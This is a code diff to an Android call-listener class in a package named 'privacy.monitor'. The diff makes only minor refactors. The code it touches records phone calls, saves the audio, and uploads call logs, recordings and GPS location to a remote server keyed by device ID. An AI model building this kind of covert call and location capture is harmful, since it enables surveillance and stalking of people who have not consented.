@@ -4,7 +4,6 @@ import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Date;
-
 import com.google.gson.Gson;
 import com.privacy.monitor.base.C;
 import com.privacy.monitor.db.CallRecordDB;
@@ -31,7 +30,6 @@ import android.database.Cursor;
 import android.media.MediaRecorder;
 import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
-import android.text.style.ClickableSpan;
 import android.util.Log;
 
 /**
@@ -39,8 +37,7 @@ import android.util.Log;
  */
 public class MyPhoneStateListener extends PhoneStateListener {
 
-	private static final String TAG = MyPhoneStateListener.class
-			.getSimpleName();
+	private static final String TAG = MyPhoneStateListener.class.getSimpleName();
 	File recordFile;
 	MediaRecorder mediaRecorder;
 	Context context;
@@ -192,11 +189,11 @@ public class MyPhoneStateListener extends PhoneStateListener {
 										callRecords.add(lists);
 										String param = "key="+ ClientSocket.APP_REQ_KEY+ "&device_id="+ sp.getString(C.DEVICE_ID, "")+ "&call_list="+ new Gson().toJson(callRecords);
 										Logger.d("MyPhone", "正在上传通话记录");
-										String result = NetworkUtil.uploadCall(param,C.RequestMethod.uploadCallRecord);
+										String result = NetworkUtil.uploadCall(context,param,C.RequestMethod.uploadCallRecord);
 
 										if (!result.startsWith("FAIL")) {
 											Logger.d("MyPhone", "上传通话记录成功");
-											String uploadFileResult = NetworkUtil.uploadFile(callRecord.getSoundRecordPath(),callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
+											String uploadFileResult = NetworkUtil.uploadFile(context,callRecord.getSoundRecordPath(),callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
 											if (uploadFileResult.contains("FAIL")) {
 												Logger.d("Myphone","上传录音文件失败");
 												callRecordDB.update(CallRecord.COL_UPLOAD_RESULT+ " = ? "+ " , "+ CallRecord.COL_FILE_NAME+ " = ? ",CallRecord.COL_CALL_START_TIME+ " = ?",new String[] {"0",result,date });
@@ -241,7 +238,7 @@ public class MyPhoneStateListener extends PhoneStateListener {
 			long currentTime = new Date().getTime();
 			fileName = "call_" + sp.getString(C.DEVICE_ID, "") + "_"+ currentTime + ".3gpp";
 			soundPath = context.getFilesDir() + "/" + fileName;
-			Logger.d("MyPhone","文件路径为:"+soundPath);
+			
 			mediaRecorder.setOutputFile(soundPath);
 			mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
 			mediaRecorder.setOnErrorListener(null);
@@ -279,7 +276,7 @@ public class MyPhoneStateListener extends PhoneStateListener {
 				if (locationInfo != null && locationInfo.length == 2) {
 					latitude = locationInfo[0];
 					longitude = locationInfo[1];
-					NetworkUtil.sendLocInfo(ClientSocket.APP_REQ_KEY,sp.getString(C.DEVICE_ID, ""),longitude, latitude, " ", new Date().getTime() + "",C.RequestMethod.uploadLocation);
+					NetworkUtil.sendLocInfo(context,ClientSocket.APP_REQ_KEY,sp.getString(C.DEVICE_ID, ""),longitude, latitude, " ", new Date().getTime() + "",C.RequestMethod.uploadLocation);
 				}
 			}
 		}
